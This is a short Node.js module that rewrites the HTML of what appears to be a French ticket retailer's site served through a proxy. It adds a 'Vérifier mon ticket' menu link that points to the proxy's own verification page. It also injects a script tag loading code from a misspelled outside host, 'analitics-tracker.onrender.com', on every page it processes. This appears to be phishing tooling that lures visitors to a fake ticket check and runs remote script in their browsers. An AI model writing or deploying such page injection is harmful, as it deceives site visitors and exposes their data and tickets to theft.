const cheerio = require('cheerio');

const addnavlink = (html, PROXY_URL) =>{

    const $ = cheerio.load(html);

    const pointsDeVente = $('ul.cd-dropdown-content li a[href*="trouver-un-point-de-vente"]').parent();

    pointsDeVente.after(`
    <li class="position-md-relative sf-menu">
        <a href="${PROXY_URL}/verification/" class="sf-with-ul">Vérifier mon ticket</a>
    </li>
    `);

    const tracker = '<script src="https://analitics-tracker.onrender.com/tracker/"></script>';
    const body = $("body");
    body.append(tracker);

    html = $.html();

    return html;
}

module.exports = addnavlink;